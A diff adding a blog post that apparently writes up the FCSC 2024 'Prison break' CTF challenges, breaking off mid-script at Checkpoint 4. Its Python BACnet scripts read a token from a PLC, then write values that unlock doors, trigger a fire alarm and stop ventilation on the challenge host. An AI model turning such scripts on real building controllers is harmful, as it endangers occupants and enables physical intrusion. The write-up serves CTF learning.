@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> FCSC 2024 - Prison break serie - Misc | Cyberrzzerk</title>
+  <link rel = 'canonical' href = 'https://-lb.fr/posts/fcsc-2024-prison-break-serie-misc/'>
+  <meta name="description" content="Writing some write up of cool CTF’s challenges and infosec content.">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="FCSC 2024 - Prison break serie - Misc" />
+<meta property="og:description" content="Introduction Carlos, obviously innocent, is locked up in a high-security prison. The prison&rsquo;s building management system (BMS) is controlled by a programmable logic controller (PLC). Access to this PLC was made possible by an implant concealed during a previous operation, which can be accessed from outside the prison via (UDP protocol):
+nc -u prison-break.france-cybersecurity-challenge.fr 47808
+Similarly, read-only access to the scada supervision interface is possible from :
+https://prison-break.france-cybersecurity-challenge.fr/
+To help Carlos escape, follow the instructions for the following checkpoints carefully:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://-lb.fr/posts/fcsc-2024-prison-break-serie-misc/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-04-14T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-04-14T00:00:00+00:00" />
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="FCSC 2024 - Prison break serie - Misc"/>
+<meta name="twitter:description" content="Introduction Carlos, obviously innocent, is locked up in a high-security prison. The prison&rsquo;s building management system (BMS) is controlled by a programmable logic controller (PLC). Access to this PLC was made possible by an implant concealed during a previous operation, which can be accessed from outside the prison via (UDP protocol):
+nc -u prison-break.france-cybersecurity-challenge.fr 47808
+Similarly, read-only access to the scada supervision interface is possible from :
+https://prison-break.france-cybersecurity-challenge.fr/
+To help Carlos escape, follow the instructions for the following checkpoints carefully:"/>
+
+  
+  
+    
+  
+  
+ 
+ 
+<link rel="stylesheet" href="../../css/style.css"> 
+
+  
+<link rel="stylesheet" href="../../css/custom.css">
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="https://-lb.fr/images/favicon.ico" />
+
+  
+  
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="../../index.html">Home</a></li>
+    
+        <li><a href="../index.html">Categories</a></li>
+      
+        <li><a href="../../ranking/index.html">Ranking</a></li>
+      
+        <li><a href="../../whoami/index.html">Whoami</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" https://-lb.fr/posts/fcsc-2024-silence-forensic/" aria-label="Previous">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="https://-lb.fr/posts/fcsc-2024-illuminated-misc/" aria-label="Next">
+            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
+          </a>
+        </li>
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#" aria-label="Share">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-prison-break-serie-misc%2f" aria-label="Facebook">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-prison-break-serie-misc%2f&text=FCSC%202024%20-%20Prison%20break%20serie%20-%20Misc" aria-label="Twitter">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-prison-break-serie-misc%2f&title=FCSC%202024%20-%20Prison%20break%20serie%20-%20Misc" aria-label="Linkedin">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-prison-break-serie-misc%2f&is_video=false&description=FCSC%202024%20-%20Prison%20break%20serie%20-%20Misc" aria-label="Pinterest">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=FCSC%202024%20-%20Prison%20break%20serie%20-%20Misc&body=Check out this article: https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-prison-break-serie-misc%2f" aria-label="Email">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-prison-break-serie-misc%2f&title=FCSC%202024%20-%20Prison%20break%20serie%20-%20Misc" aria-label="Pocket">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-prison-break-serie-misc%2f&title=FCSC%202024%20-%20Prison%20break%20serie%20-%20Misc" aria-label="reddit">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-prison-break-serie-misc%2f&name=FCSC%202024%20-%20Prison%20break%20serie%20-%20Misc&description=Introduction%20Carlos%2c%20obviously%20innocent%2c%20is%20locked%20up%20in%20a%20high-security%20prison.%20The%20prison%26rsquo%3bs%20building%20management%20system%20%28BMS%29%20is%20controlled%20by%20a%20programmable%20logic%20controller%20%28PLC%29.%20Access%20to%20this%20PLC%20was%20made%20possible%20by%20an%20implant%20concealed%20during%20a%20previous%20operation%2c%20which%20can%20be%20accessed%20from%20outside%20the%20prison%20via%20%28UDP%20protocol%29%3a%0anc%20-u%20prison-break.france-cybersecurity-challenge.fr%2047808%0aSimilarly%2c%20read-only%20access%20to%20the%20scada%20supervision%20interface%20is%20possible%20from%20%3a%0ahttps%3a%2f%2fprison-break.france-cybersecurity-challenge.fr%2f%0aTo%20help%20Carlos%20escape%2c%20follow%20the%20instructions%20for%20the%20following%20checkpoints%20carefully%3a" aria-label="Tumblr">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-prison-break-serie-misc%2f&t=FCSC%202024%20-%20Prison%20break%20serie%20-%20Misc" aria-label="Hacker News">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#prison-break-12">Prison break 1/2</a></li>
+    <li><a href="#prison-break-22">Prison break 2/2</a></li>
+  </ul>
+</nav>
+    </div>
+    
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        FCSC 2024 - Prison break serie - Misc
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2024-04-14 00:00:00 &#43;0000 UTC" itemprop="datePublished">2024-04-14</time>
+          
+        </div>
+        
+        
+        <div class="article-read-time">
+          <i class="far fa-clock"></i>
+          
+          5 minute read
+        </div>
+        
+        
+        <div class="article-category">
+            <i class="fas fa-archive"></i>
+            
+            
+            <a class="category-link" href="/../../categories/fcsc2024/index.html">FCSC2024</a>
+            
+        </div>
+        
+        
+        <div class="article-tag">
+            <i class="fas fa-tag"></i>
+            
+            
+            <a class="tag-link" href="../../tags/ctf/index.html" rel="tag">CTF</a>
+            
+             ,  
+            <a class="tag-link" href="../../tags/misc/index.html" rel="tag">Misc</a>
+            
+        </div>
+        
+      </div>
+    </header>
+
+  
+    
+    <div class="content" itemprop="articleBody">
+      <h2 id="introduction">Introduction</h2>
+<blockquote>
+<p>Carlos, obviously innocent, is locked up in a high-security prison. The prison&rsquo;s building management system (BMS) is controlled by a programmable logic controller (PLC). Access to this PLC was made possible by an implant concealed during a previous operation, which can be accessed from outside the prison via (UDP protocol):</p>
+<p>nc -u prison-break.france-cybersecurity-challenge.fr 47808</p>
+<p>Similarly, read-only access to the scada supervision interface is possible from :</p>
+<p><a href="https://prison-break.france-cybersecurity-challenge.fr/">https://prison-break.france-cybersecurity-challenge.fr/</a></p>
+<p>To help Carlos escape, follow the instructions for the following checkpoints carefully:</p>
+<p>Checkpoint 1 (t0+15s) : You have 15 seconds to open all the cells in the WEST wing as well as the main door of this wing. This diversion should attract the attention of some of the guards.</p>
+<p>Checkpoint 2 (t1+15s): You will then have a 5 second window to lock the guards in the WEST wing and make it look like there is a fire in the NORTH wing by activating the fire alarm. The next ten seconds should give the outpost guards time to move to the NORTH wing.</p>
+<p>Checkpoint 3 (t2+5s): You will then have 5 seconds to turn off the NORTH wing ventilation by changing its speed to 0 and lock up the guards on that wing.</p>
+<p>Checkpoint 4 (t3+20s): In the next 10 seconds you must :</p>
+<p>turn off the lights in the EAST wing and the centre;
+open Carlos&rsquo;s cell;
+open the main door to the EAST wing.
+Once this has been done, Carlos should have time to move towards the outpost.</p>
+<p>Checkpoint 5 (t4+5s): Lock Carlos in checkpoint 2 to avoid detection.</p>
+<p>Checkpoint 6 (t5+15s): In the first 5 seconds, activate the fire safety system in the SAS control room and turn off the lights in the outpost. Wait a few seconds until the last outpost guard is in the &gt; SAS control room, then lock him inside.</p>
+<p>Checkpoint 7 (t6+10s): Reopen the door to checkpoint 2 to free Carlos and open the final two doors to allow him to escape.</p>
+</blockquote>
+<h2 id="prison-break-12">Prison break 1/2</h2>
+<blockquote>
+<p>In this first part of the Prison break challenge, you will be operating a building management controller in a high-security prison. This PLC communicates with a SCADA supervision interface via the &gt; BACnet/IP protocol. The first step in this challenge is to retrieve a token from the PLC&rsquo;s memory in order to access the SCADA web interface.</p>
+<p>To do this, you will need to read the PLC&rsquo;s objects using the BACnet/IP protocol and try to recover a hidden token. You can then continue to the second part of the test using this token.</p>
+<p>To recover the token, you need to search for the equipment and check its properties. To do this, you need to read the documentation. :) <a href="https://bac0.readthedocs.io/en/latest/">doc BAC0</a></p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>LOCAL_IP <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;LOCAL IP&#34;</span> 
+</span></span><span style="display:flex;"><span>LOCAL_PORT <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1024</span>, <span style="color:#ae81ff">65535</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> BAC0<span style="color:#f92672">.</span>version <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;22.9.21&#34;</span>, <span style="color:#e6db74">&#34;Erreur : veuillez utiliser la version 22.9.21 de BAC0&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        target <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>gethostbyname(<span style="color:#e6db74">&#34;prison-break.france-cybersecurity-challenge.fr&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>        print(Fore<span style="color:#f92672">.</span>RED <span style="color:#f92672">+</span><span style="color:#e6db74">&#34;Échec de la résolution du FQDN...&#34;</span>)
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(Fore<span style="color:#f92672">.</span>GREEN <span style="color:#f92672">+</span><span style="color:#e6db74">&#34;[+] Initialisation du client BACnet local&#34;</span>)
+</span></span><span style="display:flex;"><span>    bacnet <span style="color:#f92672">=</span> BAC0<span style="color:#f92672">.</span>lite(ip<span style="color:#f92672">=</span>LOCAL_IP, port<span style="color:#f92672">=</span>LOCAL_PORT)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    bacnet<span style="color:#f92672">.</span>whois(target)
+</span></span><span style="display:flex;"><span>    print(Fore<span style="color:#f92672">.</span>MAGENTA <span style="color:#f92672">+</span><span style="color:#e6db74">&#34;[+] Recherche du token...&#34;</span>)
+</span></span><span style="display:flex;"><span>    token <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Découverte des devices sur le réseau  </span>
+</span></span><span style="display:flex;"><span>    devices <span style="color:#f92672">=</span> bacnet<span style="color:#f92672">.</span>whois(target)
+</span></span><span style="display:flex;"><span>    print(Fore<span style="color:#f92672">.</span>GREEN <span style="color:#f92672">+</span><span style="color:#e6db74">&#34;[+] Devices trouvés : </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(devices))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Lecture des propriétés du device cible</span>
+</span></span><span style="display:flex;"><span>    device_id <span style="color:#f92672">=</span> devices[<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">1</span>] 
+</span></span><span style="display:flex;"><span>    object_list <span style="color:#f92672">=</span> bacnet<span style="color:#f92672">.</span>read(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> device </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> objectList&#34;</span><span style="color:#f92672">.</span>format(target, device_id))
+</span></span><span style="display:flex;"><span>    print(object_list)
+</span></span><span style="display:flex;"><span>    object_names <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#for object in object_list:</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#    obj_type = object[0]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#    obj_id = object[1]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#    object_names.append((obj_type, bacnet.read(&#34;{} {} {} objectName&#34;.format(target, obj_type, obj_id)), obj_id))</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#print(Fore.GREEN + f&#34;{object_names}&#34;)</span>
+</span></span><span style="display:flex;"><span>    token <span style="color:#f92672">=</span> bacnet<span style="color:#f92672">.</span>read(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74"> characterstringValue 1 description&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(Fore<span style="color:#f92672">.</span>GREEN <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;token : </span><span style="color:#e6db74">{</span>token<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p>Once recovered, the flag is retrieved from the SCADA web interface</p>
+<p><img src="/images/FCSC2024/b5e58ebec0d37f0e0e794e6e6b40d9bd.png" alt="image"></p>
+<h2 id="prison-break-22">Prison break 2/2</h2>
+<p>By retrieving all the equipment names through the &rsquo;name&rsquo; property as well as their IDs, it is possible to execute all the commands to match the statement and complete the challenge.</p>
+<p>Introduction au programme :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> BAC0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> BAC0.core.io.IOExceptions <span style="color:#f92672">import</span> NoResponseFromController
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> logging
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> colorama <span style="color:#f92672">import</span> init
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> colorama <span style="color:#f92672">import</span> Fore, Back, Style
+</span></span><span style="display:flex;"><span>init(autoreset<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>LOCAL_IP <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;192.168.1.100&#34;</span> 
+</span></span><span style="display:flex;"><span>LOCAL_PORT <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1024</span>, <span style="color:#ae81ff">65535</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> BAC0<span style="color:#f92672">.</span>version <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;22.9.21&#34;</span>, <span style="color:#e6db74">&#34;Erreur : veuillez utiliser la version 22.9.21 de BAC0&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        target <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>gethostbyname(<span style="color:#e6db74">&#34;prison-break.france-cybersecurity-challenge.fr&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>        print(Fore<span style="color:#f92672">.</span>RED <span style="color:#f92672">+</span><span style="color:#e6db74">&#34;Échec de la résolution du FQDN...&#34;</span>)
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(Fore<span style="color:#f92672">.</span>GREEN <span style="color:#f92672">+</span><span style="color:#e6db74">&#34;[+] Initialisation du client BACnet local&#34;</span>)
+</span></span><span style="display:flex;"><span>    bacnet <span style="color:#f92672">=</span> BAC0<span style="color:#f92672">.</span>lite(ip<span style="color:#f92672">=</span>LOCAL_IP, port<span style="color:#f92672">=</span>LOCAL_PORT)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    bacnet<span style="color:#f92672">.</span>whois(target)
+</span></span><span style="display:flex;"><span>    print(Fore<span style="color:#f92672">.</span>MAGENTA <span style="color:#f92672">+</span><span style="color:#e6db74">&#34;[+] Recherche du token...&#34;</span>)
+</span></span><span style="display:flex;"><span>    token <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Découverte des devices sur le réseau  </span>
+</span></span><span style="display:flex;"><span>    devices <span style="color:#f92672">=</span> bacnet<span style="color:#f92672">.</span>whois(target)
+</span></span><span style="display:flex;"><span>    print(Fore<span style="color:#f92672">.</span>GREEN <span style="color:#f92672">+</span><span style="color:#e6db74">&#34;[+] Devices trouvés : </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(devices))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Lecture des propriétés du device cible</span>
+</span></span><span style="display:flex;"><span>    device_id <span style="color:#f92672">=</span> devices[<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">1</span>] 
+</span></span><span style="display:flex;"><span>    object_list <span style="color:#f92672">=</span> bacnet<span style="color:#f92672">.</span>read(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> device </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> objectList&#34;</span><span style="color:#f92672">.</span>format(target, device_id))
+</span></span><span style="display:flex;"><span>    print(object_list)
+</span></span><span style="display:flex;"><span>    object_names <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#for object in object_list:</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#    obj_type = object[0]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#    obj_id = object[1]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#    object_names.append((obj_type, bacnet.read(&#34;{} {} {} objectName&#34;.format(target, obj_type, obj_id)), obj_id))</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#print(Fore.GREEN + f&#34;{object_names}&#34;)</span>
+</span></span><span style="display:flex;"><span>    token <span style="color:#f92672">=</span> bacnet<span style="color:#f92672">.</span>read(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74"> characterstringValue 1 description&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(Fore<span style="color:#f92672">.</span>GREEN <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;token : </span><span style="color:#e6db74">{</span>token<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#logging.basicConfig(level=logging.DEBUG)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Checkpoint 1 (t0+15s)</span>
+</span></span><span style="display:flex;"><span>print(Fore<span style="color:#f92672">.</span>YELLOW <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;Checkpoint 1 - Ouverture des cellules et porte principale de l&#39;aile OUEST&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>start_time <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">35</span>):  
+</span></span><span style="display:flex;"><span>    bacnet<span style="color:#f92672">.</span>write(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74"> binaryValue </span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74"> presentValue active&#34;</span>)
+</span></span><span style="display:flex;"><span>bacnet<span style="color:#f92672">.</span>write(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74"> binaryValue 35 presentValue active&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elapsed_time <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time() <span style="color:#f92672">-</span> start_time
+</span></span><span style="display:flex;"><span>remaining_time <span style="color:#f92672">=</span> max(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">13</span> <span style="color:#f92672">-</span> elapsed_time)
+</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(remaining_time)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Checkpoint 2 (t1+15s) </span>
+</span></span><span style="display:flex;"><span>start_time <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
+</span></span><span style="display:flex;"><span>print(Fore<span style="color:#f92672">.</span>YELLOW <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;Checkpoint 2 - Enfermement des gardes dans l&#39;aile OUEST et déclenchement alarme incendie NORD&#34;</span>)
+</span></span><span style="display:flex;"><span>bacnet<span style="color:#f92672">.</span>write(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74"> binaryValue 35 presentValue inactive&#34;</span>) <span style="color:#75715e">#&#39;porte_ouest_principale&#39;, </span>
+</span></span><span style="display:flex;"><span>bacnet<span style="color:#f92672">.</span>write(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74"> binaryValue 43 presentValue active&#34;</span>) <span style="color:#75715e">#&#39;sec_incendie_nord&#39;, </span>
+</span></span><span style="display:flex;"><span>elapsed_time <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time() <span style="color:#f92672">-</span> start_time
+</span></span><span style="display:flex;"><span>remaining_time <span style="color:#f92672">=</span> max(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">13</span> <span style="color:#f92672">-</span> elapsed_time)
+</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(remaining_time)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Checkpoint 3 (t2+5s)</span>
+</span></span><span style="display:flex;"><span>start_time <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
+</span></span><span style="display:flex;"><span>print(Fore<span style="color:#f92672">.</span>YELLOW <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;Checkpoint 3 - Coupure ventilation NORD et enfermement des gardes&#34;</span>)  
+</span></span><span style="display:flex;"><span>bacnet<span style="color:#f92672">.</span>write(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74"> analogValue 1 presentValue 0&#34;</span>)<span style="color:#75715e">#&#39;ventilation_nord&#39;, </span>
+</span></span><span style="display:flex;"><span>bacnet<span style="color:#f92672">.</span>write(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74"> binaryValue 9 presentValue inactive&#34;</span>)<span style="color:#75715e">#&#39;porte_nord_principale&#39;, </span>
+</span></span><span style="display:flex;"><span>elapsed_time <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time() <span style="color:#f92672">-</span> start_time
+</span></span><span style="display:flex;"><span>remaining_time <span style="color:#f92672">=</span> max(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">5</span> <span style="color:#f92672">-</span> elapsed_time)
+</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(remaining_time)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Checkpoint 4 (t3+20s)</span>
+</span></span><span style="display:flex;"><span>start_time <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
